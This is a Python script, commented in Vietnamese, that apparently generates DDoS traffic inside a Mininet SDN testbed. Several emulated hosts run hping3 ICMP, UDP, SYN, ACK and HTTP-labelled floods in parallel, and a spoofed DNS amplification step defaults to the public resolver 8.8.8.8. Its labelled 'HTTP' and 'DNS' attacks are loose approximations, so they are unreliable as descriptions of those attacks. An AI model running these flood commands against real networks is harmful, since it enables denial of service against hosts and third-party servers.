#!/usr/bin/env python3
"""
generate_ddos_trafic_advanced.py
- Hỗ trợ nhiều kiểu tấn công: ICMP, UDP, TCP SYN, TCP ACK, HTTP, DNS Amplification
- Chạy song song nhiều host tấn công
- Có thể chọn victim cố định hoặc ngẫu nhiên
- Thời gian tấn công có thể cấu hình
"""

from mininet.topo import Topo
from mininet.net import Mininet
from mininet.link import TCLink
from mininet.log import setLogLevel
from mininet.node import OVSKernelSwitch, RemoteController
from time import sleep
from datetime import datetime
from random import randrange, choice, sample
import threading
import shutil
import os
import sys

# ========== CẤU HÌNH ==========
ATTACK_DURATION = 60      # giây cho mỗi loại tấn công
NUM_ATTACKERS = 4         # số host tấn công song song
SLEEP_BETWEEN = 20        # giây nghỉ giữa các loại tấn công
VICTIM_IP = None          # Để None sẽ chọn ngẫu nhiên (không phải web server)
WEB_SERVER_IP = "10.0.0.1"
WEB_SERVER_HOST = "h1"

class MyTopo(Topo):
    def build(self):
        # Switches
        s1 = self.addSwitch('s1', cls=OVSKernelSwitch, protocols='OpenFlow13')
        s2 = self.addSwitch('s2', cls=OVSKernelSwitch, protocols='OpenFlow13')
        s3 = self.addSwitch('s3', cls=OVSKernelSwitch, protocols='OpenFlow13')
        s4 = self.addSwitch('s4', cls=OVSKernelSwitch, protocols='OpenFlow13')
        s5 = self.addSwitch('s5', cls=OVSKernelSwitch, protocols='OpenFlow13')
        s6 = self.addSwitch('s6', cls=OVSKernelSwitch, protocols='OpenFlow13')

        # Hosts
        hosts = []
        for i in range(1, 19):
            h = self.addHost(f'h{i}', cpu=1.0/20, mac=f"00:00:00:00:00:{i:02d}", ip=f"10.0.0.{i}/24")
            hosts.append(h)

        # Connect hosts to switches (3 hosts per switch)
        switches = [s1, s2, s3, s4, s5, s6]
        for idx, h in enumerate(hosts):
            sw = switches[idx // 3]
            self.addLink(h, sw)

        # Connect switches in a chain
        self.addLink(s1, s2)
        self.addLink(s2, s3)
        self.addLink(s3, s4)
        self.addLink(s4, s5)
        self.addLink(s5, s6)

def ip_generator(exclude_ip=None):
    while True:
        ip = "10.0.0." + str(randrange(1, 19))
        if ip != exclude_ip:
            return ip

# ========== CÁC HÀM TẤN CÔNG ==========
def icmp_flood(host, target_ip, duration=60, **kwargs):
    host.cmd(f"timeout {duration}s hping3 -1 --rand-source --flood {target_ip}")

def udp_flood(host, target_ip, duration=60, port=80, **kwargs):
    host.cmd(f"timeout {duration}s hping3 -2 -p {port} --rand-source --flood {target_ip}")

def tcp_syn_flood(host, target_ip, duration=60, port=80, **kwargs):
    host.cmd(f"timeout {duration}s hping3 -S -p {port} --rand-source --flood {target_ip}")

def tcp_ack_flood(host, target_ip, duration=60, port=80, **kwargs):
    host.cmd(f"timeout {duration}s hping3 -A -p {port} --rand-source --flood {target_ip}")

def http_flood(host, target_ip, duration=60, port=80, **kwargs):
    # Tạo payload HTTP GET
    payload = f"GET / HTTP/1.1\\r\\nHost: {target_ip}\\r\\n\\r\\n"
    host.cmd(f"timeout {duration}s hping3 -S -p {port} --rand-source --flood --data '{payload}' {target_ip}")

def dns_amplification(host, target_ip, duration=60, dns_server="8.8.8.8", **kwargs):
    """
    Giả lập DNS amplification: Gửi gói UDP đến DNS server với source IP giả mạo là target_ip
    Lưu ý: Cần có quyền gửi gói tin với IP giả mạo (hping3 hỗ trợ)
    """
    host.cmd(f"timeout {duration}s hping3 -2 -p 53 --flood --rand-source --spoof {target_ip} {dns_server}")

# Danh sách các loại tấn công (tên, hàm, kwargs mặc định)
ATTACKS = [
    ("ICMP Flood", icmp_flood, {}),
    ("UDP Flood", udp_flood, {"port": 80}),
    ("TCP SYN Flood", tcp_syn_flood, {"port": 80}),
    ("TCP ACK Flood", tcp_ack_flood, {"port": 80}),
    ("HTTP Flood", http_flood, {"port": 80}),
    ("DNS Amplification", dns_amplification, {"dns_server": "8.8.8.8"}),
]

def parallel_attack(hosts, attack_func, target_ip, duration=60, num_attackers=3, **kwargs):
    """Chạy tấn công từ nhiều host song song."""
    attackers = sample(hosts, min(num_attackers, len(hosts)))
    threads = []
    for attacker in attackers:
        t = threading.Thread(target=attack_func, args=(attacker, target_ip, duration), kwargs=kwargs)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def start_web_server(net, host_name=WEB_SERVER_HOST):
    host = net.get(host_name)
    web_dir = '/home/mininet/webserver'
    if os.path.isdir(web_dir):
        host.cmd(f'cd {web_dir} && python3 -m http.server 80 &')
        print(f"[+] Web server started on {host_name}:80")
    else:
        print(f"[-] Directory {web_dir} not found. Web server not started.")

def startNetwork():
    if not shutil.which('hping3'):
        print("Error: hping3 not installed. Run: sudo apt install hping3")
        return

    topo = MyTopo()
    c0 = RemoteController('c0', ip='127.0.0.1', port=6653)
    net = Mininet(topo=topo, link=TCLink, controller=c0)

    try:
        net.start()
        hosts = [net.get(f'h{i}') for i in range(1, 19)]
        web_server = net.get(WEB_SERVER_HOST)
        start_web_server(net)

        # Xác định victim
        if VICTIM_IP:
            victim = VICTIM_IP
            print(f"[+] Victim IP fixed: {victim}")
        else:
            # Chọn ngẫu nhiên không phải web server
            possible_victims = [h for h in hosts if h != web_server]
            victim = choice(possible_victims).IP()
            print(f"[+] Victim IP randomly: {victim}")

        # Chạy từng loại tấn công
        for attack_name, attack_func, kwargs in ATTACKS:
            print(f"\n=== {attack_name} ===")
            print(f"Target: {victim}, Duration: {ATTACK_DURATION}s, Attackers: {NUM_ATTACKERS}")
            parallel_attack(hosts, attack_func, victim, ATTACK_DURATION, NUM_ATTACKERS, **kwargs)
            print(f"=== {attack_name} finished ===")
            if SLEEP_BETWEEN > 0:
                sleep(SLEEP_BETWEEN)

        print("\n[+] All attacks completed.")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    finally:
        net.stop()
        print("[+] Network cleaned up.")

if __name__ == '__main__':
    # Có thể override cấu hình bằng biến môi trường hoặc dòng lệnh
    if len(sys.argv) > 1:
        try:
            ATTACK_DURATION = int(sys.argv[1])
        except: pass
    start = datetime.now()
    setLogLevel('info')
    startNetwork()
    end = datetime.now()
    print(f"Total time: {end-start}")